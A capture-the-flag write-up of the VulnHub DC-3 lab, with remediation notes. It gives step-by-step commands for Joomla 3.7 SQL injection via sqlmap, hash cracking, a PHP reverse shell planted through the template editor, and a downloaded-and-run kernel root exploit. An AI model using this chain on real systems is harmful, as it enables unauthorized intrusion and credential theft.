# DC: 3 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.1.104 (host-only) |
| **Difficulty** | Beginner/Intermediate |
| **OS** | Linux (Ubuntu 16.04) |
| **Root Flag** | /root/the-flag.txt |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/dc-32,312/) |

## Attack Summary

Joomla 3.7 on port 80 → SQLi (CVE-2017-8917) via sqlmap → admin:snoopy → PHP reverse shell via template editor → Ubuntu 16.04 kernel exploit (CVE-2016-4557, EDB 39772) → root.

## Methodology

1. Network discovery; single HTTP service
2. Identify Joomla 3.7 and known SQLi vulnerability
3. Extract admin credentials from database with sqlmap
4. Crack hash; log in to Joomla admin
5. Inject PHP reverse shell via template editor
6. Escalate via Ubuntu 16.04 kernel exploit (doubleput)

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -A 192.168.1.104
```

Only one service:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache 2.4.18 (Ubuntu)
```

Browsing to the target confirms Joomla CMS. The README.md on the VM states version **3.7**.

![Nmap scan](images/01-nmap.png)

---

## Step 2: SQLi via Joomla 3.7 (CVE-2017-8917)

Joomla 3.7.0 has an SQL injection in the `com_fields` component (EDB-42033). The vulnerable URL:

```
http://192.168.1.104/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml
```

Enumerate databases:

```bash
sqlmap -u "http://192.168.1.104/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

Found: `joomladb`, `information_schema`.

List tables in joomladb:

```bash
sqlmap -u "http://192.168.1.104/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent -D joomladb --tables --batch
```

Target the users table:

```bash
sqlmap -u "http://192.168.1.104/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump --batch
```

Hash recovered for user `admin`.

![SQLi with sqlmap](images/02-joomla-sqli.png)

---

## Step 3: Crack the Hash

Save the hash to a file:

```bash
echo '$2y$10$...<hash>...' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password: **snoopy**

---

## Step 4: PHP Reverse Shell via Joomla Template Editor

Log in to Joomla admin at `http://192.168.1.104/administrator` with **admin:snoopy**.

Navigate to: **Extensions → Templates → Templates → Beez3 → index.php**

Replace the contents with a PHP reverse shell (e.g., from `/usr/share/webshells/php/php-reverse-shell.php`), setting your attacker IP and port.

Start a listener:

```bash
nc -lvnp 4444
```

Trigger the shell by browsing to:

```
http://192.168.1.104/
```

Stabilize the shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
uname -a
lsb_release -a
```

Output confirms: **Ubuntu 16.04.4 LTS**, kernel **4.4.0-116-generic**.

![PHP shell via Joomla template](images/03-joomla-shell.png)

---

## Step 5: Kernel Privilege Escalation (CVE-2016-4557 / EDB-39772)

Ubuntu 16.04 with kernel < 4.4.0-119 is vulnerable to a local privilege escalation via eBPF (doubleput).

Download and compile the exploit:

```bash
cd /tmp
wget https://www.exploit-db.com/exploits/39772 -O 39772.zip
unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

A root shell spawns:

```bash
whoami
# root
cd /root
cat the-flag.txt
```

![Kernel exploit execution](images/04-kernel-exploit.png)
![Root flag](images/05-root-flag.png)

---

## Lessons Learned

1. **Joomla 3.7.0 SQLi (CVE-2017-8917)**: a single GET parameter is injectable without authentication. Update to 3.7.1+.
2. **bcrypt hashes**: even with bcrypt, weak passwords like "snoopy" fall to dictionary attacks. Use strong, unique passwords.
3. **Template editor RCE**: Joomla's template editor is a server-side code execution interface. Restrict it to trusted administrators and use file integrity monitoring.
4. **Kernel exploitation**: always patch the OS. `uname -a` is the first post-shell command; cross-reference with known LPEs for that kernel version.

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| Joomla SQLi (CVE-2017-8917) | Upgrade to Joomla 3.7.1+; apply vendor patch |
| Weak admin password | Enforce strong passwords + 2FA on Joomla admin panel |
| Template editor RCE | Restrict template editing to admins; consider file write permissions |
| Kernel LPE (CVE-2016-4557) | Apply Ubuntu security updates; keep kernel patched |
